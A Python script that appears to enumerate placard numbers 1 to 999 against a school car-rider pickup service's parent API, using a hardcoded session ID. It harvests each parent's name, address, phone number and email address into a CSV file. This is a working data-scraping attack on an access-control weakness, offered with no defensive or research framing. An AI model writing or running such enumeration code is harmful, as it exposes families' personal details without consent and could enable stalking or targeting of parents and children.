from operator import index
import requests
import pandas as pd
import json

headers = {
    'authority': 'api.curbsmart.net',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/x-www-form-urlencoded; multipart/form-data; charset=UTF-8',
    'origin': 'https://parent.curbsmart.net',
    'referer': 'https://parent.curbsmart.net/',
    'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
}

data1 = '{"PlacardNumber":"$num$","SchoolId":90,"Language":"en","AppVersion":"4.2.1585::4.2.1595","AppName":"CurbSmart Parent","UserAgentString":"{\\"name\\":\\"Chrome\\",\\"version\\":\\"104.0.0.0\\",\\"major\\":\\"104\\"}::{\\"name\\":\\"Windows\\",\\"version\\":\\"10\\"}","IsMobileApp":false}'
#data = '{"PlacardNumber":"233","SchoolId":90,"Startedby":120539,"CustomCarRiderName":"Car Rider","Language":"en","AppVersion":"4.2.1585::4.2.1595","AppName":"CurbSmart Parent","UserAgentString":"{\\"name\\":\\"Chrome\\",\\"version\\":\\"104.0.0.0\\",\\"major\\":\\"104\\"}::{\\"name\\":\\"Windows\\",\\"version\\":\\"10\\"}","IsMobileApp":false}'
#response = requests.post('https://api.curbsmart.net/api/parent/GetParentByPlacard?CustomCarRiderName=Car+Rider&Language=en&SessionId=!enc!djZT0eifw2UY8sS7WR29QhjPbu4TUdptHYrXfHZ9k%2Bm25qAFk%2Fw6QUI4ZlFEH2iCc5NkSuP2FC7jWP7x%2FYEA1mMTMTrfk1jpyWb%2BVyPAQCw%3D&Startedby=120539', headers=headers, data=data)

c = []

for i in range(1, 1000, 1):
    try:
        data = data1.replace('$num$', str(i))
        response = requests.post('https://api.curbsmart.net/api/parent/GetParentByPlacard?&SessionId=!enc!djZT0eifw2UY8sS7WR29QhjPbu4TUdptHYrXfHZ9k%2Bm25qAFk%2Fw6QUI4ZlFEH2iCc5NkSuP2FC7jWP7x%2FYEA1mMTMTrfk1jpyWb%2BVyPAQCw%3D', headers=headers, data=data)
        #rec = response.json()['parent']
        #df= pd.json_normalize(response.json())
        a = response.json()['parent']
        b = {k:v for k,v in a.items() if k in ['PlacardNumber', 'FirstName', 'LastName', 'Address', 'ContactNumber', 'EmailAddress']}
        print(b)
        #print(rec['PlacardNumber'], rec['FirstName'], rec['LastName'], rec['Address'], rec['ContactNumber'] )
        c.append(b)
    except:
        pass

#print(c)
df = pd.DataFrame(c)
print(df)
df.to_csv('basis.csv')


